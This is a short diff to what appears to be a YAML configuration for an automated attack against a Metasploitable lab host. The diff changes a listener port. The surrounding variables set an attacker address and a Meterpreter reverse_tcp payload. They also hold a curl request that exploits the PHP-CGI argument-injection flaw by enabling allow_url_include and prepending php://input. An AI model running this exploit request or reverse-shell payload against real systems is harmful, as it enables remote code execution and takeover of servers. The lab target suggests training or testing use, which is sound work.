@@ -20,7 +20,7 @@ vars:
   METASPLOITABLE: 172.17.0.106
   ATTACKER: 172.17.0.127
   PAYLOAD: linux/x86/meterpreter/reverse_tcp
-  LPORT: 4444
+  LPORT: 4344
   CURL: 'curl -XPOST "http://172.17.0.106/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
 
 commands:
